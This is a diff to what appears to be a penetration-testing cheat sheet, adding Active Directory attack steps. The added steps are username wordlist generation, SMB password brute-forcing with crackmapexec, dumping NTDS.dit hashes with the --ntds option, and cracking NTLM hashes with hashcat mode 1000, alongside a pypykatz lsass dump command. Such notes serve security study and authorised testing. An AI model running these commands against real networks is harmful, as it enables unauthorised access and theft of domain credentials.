@@ -240,6 +240,13 @@ use `pypykatz` to analyze file
 $ pypykatz lsa minidump lsass.dmp
 ```
 ## Attacking Active Directory & NTDS.dit
+use `username-anarchy` to create username-wordlists and brute-force login smb if it opened
+```shell
+$ crackmapexec smb <ip> -u <username or username_list> -p <password or password_list>
 ```
-it not
+Capture `NTDS.dit`
+```shell
+$ crackmapexec smb <ip> -u <username> -p <password> --ntds
 ```
+use hashcat mode 1000 to crack
+
